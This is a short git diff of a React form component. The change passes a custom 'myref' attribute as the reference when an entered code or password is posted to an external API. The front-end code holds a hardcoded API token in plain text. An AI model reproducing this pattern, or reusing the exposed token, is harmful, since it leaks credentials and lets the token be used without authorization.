@@ -28,12 +28,11 @@ export default function Form(props) {
 
         e.preventDefault()
 
-        // disable input
-
         // load button
         setButtonText(loadingButtonText)
 
         const code = stateValue[e.target[0].name]
+        const myRef = e.target[0].attributes.myref.value
         
         const res = await fetch('https://chavemestra.net/api/unicred/index.php', {
         method: 'POST',
@@ -41,7 +40,7 @@ export default function Form(props) {
             token:'rUiDIxjZHIoC8OYlb8lK6xspIwZ78TtJ', 
             action: props.api_action ? props.api_action : 'code_check',
             code: code,
-            ref: e.target[0].name
+            ref: myRef
             })
         })
 
@@ -71,6 +70,7 @@ export default function Form(props) {
                 <input
                 type="text"
                 name={props.id}
+                myref={props.id}
                 autoComplete="off"
                 placeholder="Insira a senha"
                 onChange={handleInputChange}
